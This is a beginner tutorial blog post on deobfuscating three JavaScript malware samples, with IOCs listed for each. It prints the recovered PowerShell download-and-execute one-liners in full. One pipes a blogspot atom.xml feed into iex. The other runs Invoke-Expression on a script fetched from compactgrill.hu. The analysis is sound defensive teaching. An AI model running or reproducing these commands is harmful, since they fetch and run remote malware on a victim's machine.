---
layout: post
title:  "How to analyze JavaScript obfuscation"
image: "/images/jsdeobf/cover.png"
description: "Analysis of some famous JS obfuscation techniques"
tags: [Malware-Analysis, Reverse-Engineering] 
---
Experience Level required: Beginner 

# Objectives

In this blog, we will learn how to analyze and deobfuscate Javascript malware.


# 1st Sample

Let's view the sample code

![](/images/jsdeobf/image1.jpg)

The code has obfuscation with **°** and **g0** spread throughout, so let's remove them.

We need to take care because **g0** is being used here as a variable.

![](/images/jsdeobf/image2.jpg)

So we will replace every **g0** followed by **°** with null to ensure that the variables named by **g0** will not replaced.

![](/images/jsdeobf/image3.jpg)

We need to do the same here with **g1** and **g2**

![](/images/jsdeobf/image4.jpg)

The code after cleaning:

![](/images/jsdeobf/image5.jpg)

The code idea is to reconstruct the strings in **cs** array and assign them to **g0**, **g1** and **g2** arrays then reconstruct the strings in **g0**, **g1** and **g2** to make new functions.

Let's printout **g0** and **g1**. I'll use **WScript.Echo** to print the functions.

![](/images/jsdeobf/image15.jpg)

{% highlight ps1 %}
ScriptFullName,powershell -ep Bypass -c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$(irm mainsimon1-22.blogspot.com////////////////////////////atom.xml) | . ('i*x').replace('*','e');Start-Sleep -Seconds 3,She,ll,RUN,pt.,Scripting.FileSystemObject,DeleteFile,WS,Sleep,cri

{% endhighlight %}

{% highlight ps1 %}
WS,RUN,powershell -ep Bypass -c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$(irm mainsimon1-22.blogspot.com////////////////////////////atom.xml) | . ('i*x').replace('*','e');Start-Sleep -Seconds 3,pt.,ll,Scripting.FileSystemObject,cri,She,ScriptFullName,DeleteFile,Sleep
{% endhighlight %}

It's powershell script retrieving the contents of Atom feed from "mainsimon1-22.blogspot.com////////////////////////////atom.xml"

Let's visit this url

![](/images/jsdeobf/image17.jpg)

Oh, It's another script. It is the second stage of this malware.

Let's see what **URLhaus** says about this URL

![](/images/jsdeobf/image16.jpg)

We need to see the new functions that were reconstructed. Let's print them.

![](/images/jsdeobf/image6.jpg)

Let's run the script.

![](/images/jsdeobf/image7.jpg)

![](/images/jsdeobf/image8.jpg)

{% highlight ps1 %}
WScript.Shell
RUN
{% endhighlight %}

![](/images/jsdeobf/image9.jpg)
![](/images/jsdeobf/image10.jpg)

{% highlight ps1 %}
WScript.Sleep(5000)
{% endhighlight %}

![](/images/jsdeobf/image11.jpg)

![](/images/jsdeobf/image12.jpg)
![](/images/jsdeobf/image13.jpg)
![](/images/jsdeobf/image14.jpg)

{% highlight ps1 %}
Scripting.FileSystemObject
DeleteFile
ScriptFullName
{% endhighlight %}

## I0Cs

{% highlight text %}
mainsimon1-22.blogspot.com////////////////////////////atom.xml

648305313f600305895aa8b78f7981768fbb87eca02337170883ab0194ea1e32
{% endhighlight %}

# 2nd Sample

The script uses large variable names to make analysis harder.

![](/images/jsdeobf/image18.jpg)

The malware reverses a reversed URL and assigns it to a variable

![](/images/jsdeobf/image19.jpg)

{% highlight text %}
hxxps[://]paste[.]ee/d/EeJBg
{% endhighlight %}

Let's rename this variable to "mw_url"

![](/images/jsdeobf/image20.jpg)

The malware creates a new instance of **MSXML2.ServerXMLHTTP.6.0** object (which can used to make HTTP requests) and assigns it to a variable

![](/images/jsdeobf/image21.jpg)

I'll rename the variable to "http_request"

Then It sends a http request to the url "hxxps[://]paste[.]ee/d/EeJBg"

![](/images/jsdeobf/image22.jpg)

It gets the response from the c2 server and assigns it to a variable, then the malware uses **eval** to execute it.

![](/images/jsdeobf/image23.jpg)

## I0Cs

{% highlight ps1 %}
hxxps[://]paste[.]ee/d/EeJBg

40fe1aeb3407c64e8336ac8aecaa20a9c5f9419647ca83624f03f8dbeab16361
{% endhighlight %}

# 3rd Sample

This naming schema is a common way of obfuscating JS files.

![](/images/jsdeobf/image24.jpg)

which is the use of hexadecimal values as names for variables and functions.

![](/images/jsdeobf/image25.jpg)

Also, splitting the strings into small parts and storing them in an obfuscated form as indexes in an array and reconstructing them at run time.

This kind of obfuscator is not humanely obfuscated, there are some tools that can be used to convert JS code to this kind of obfuscated form, this is not used in malware development and defense bypass only, but it is also used in legitimate code to prevent showing some of the functionality of the script from the end user as JS is used as a client-side programming language on the Web development and the developer some times needs to use this kind of obfuscation to make it harder for an attacker to find anything interesting left there accidentally or by mistake.

Also because of that, some sites implemented a feature that can try to find the obfuscator used to obfuscate the JS file and others use dynamic analysis and sandboxing to analyze the sample and reconstruct a more readable version of it for you.

[This Site](https://deobfuscate.io/) is a great one that can do the deobfuscation for you, when you paste your obfuscated script, you will get a message like the following suggesting a deofuscator for you, keep in mind that these tools won't give you the clean version but it will try to get you the most readable version it can.

![](/images/jsdeobf/image26.jpg)

here we can find the output script.

![](/images/jsdeobf/image27.jpg)

Although you may see the code as it's still heavily obfuscated, but actually about 90% of them are just decoding functions that can be passed with simple dynamic analysis.

when focusing more on the deobfuscated code, we can find interesting parts that showed to us, these are the parts that we can set a breakpoint on and let the debugger take the rest of the decoding stuff.

![](/images/jsdeobf/image28.jpg)
![](/images/jsdeobf/image29.jpg)
![](/images/jsdeobf/image30.jpg)

when going with the debugger, we can find artifacts started to appear, here we can find a C2 address of a text file seems to be the second stage.

![](/images/jsdeobf/image31.png)

By continuing the execution, we can find a PowerShell script one linear gets decoded also to be executed.

![](/images/jsdeobf/image32.png)

here is the full script.

{% highlight ps1 %}
"powershell -ExecutionPolicy Bypass -NoProfile -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://compactgrill.hu/care.txt')\""
{% endhighlight %}

As appears here, the final goal for the script is to download a script stored in a text file on a remote server and run it using PowerShell.

## IOCs

{% highlight text %}
da13cd92728c03754d8d81783946bc936d078669af24cbe4133f72c0ae14e2ae

hxxps[:]//compactgrill[.]hu/care.txt

{% endhighlight %}


This blog is authored by **Mostafa Farghaly(M4lcode)**.